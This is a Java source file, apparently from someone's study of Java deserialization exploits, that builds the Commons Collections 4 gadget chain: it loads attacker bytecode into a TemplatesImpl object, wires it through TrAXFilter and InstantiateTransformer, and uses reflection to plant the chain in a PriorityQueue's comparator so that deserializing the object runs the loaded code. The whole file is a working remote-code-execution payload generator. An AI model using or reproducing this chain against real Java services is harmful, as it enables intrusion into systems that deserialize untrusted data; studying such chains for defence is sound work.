package com.yyjccc.CommonsExp;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.yyjccc.Utils.Tool;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class Cc4 {
    public static String loadPath="D:\\coderesp\\java\\learn\\exp\\target\\classes\\org\\example\\test.class";
    public static Object cc4() throws Exception {
        TemplatesImpl templates= new TemplatesImpl();

        Class tc=templates.getClass();
        Field namefield = tc.getDeclaredField("_name");
        namefield.setAccessible(true);
        namefield.set(templates,"aaa");
        Field bytecodefield = tc.getDeclaredField("_bytecodes");
        bytecodefield.setAccessible(true);
        //赋给我们的字节码,二维数组，代码会循环遍历
        byte[] code= Files.readAllBytes(Paths.get(loadPath));
        byte [][]  codes={code};
        bytecodefield.set(templates,codes);

        Field tfactoryfield = tc.getDeclaredField("_tfactory");
        tfactoryfield.setAccessible(true);
        //在readObject中赋值了new TransformerFactoryImpl()
        tfactoryfield.set(templates,new TransformerFactoryImpl());

//        templates.newTransformer();
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };
//
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //之后操作就是为了触发chainedTransformer.transform()
        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));

        //创建反序列化入口类

        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        priorityQueue.add(1);
        priorityQueue.add(2);

        Class c = transformingComparator.getClass();
        Field tfactoryfeild = c.getDeclaredField("transformer");
        tfactoryfeild.setAccessible(true);
        tfactoryfeild.set(transformingComparator,chainedTransformer );
      return priorityQueue;
    }
}
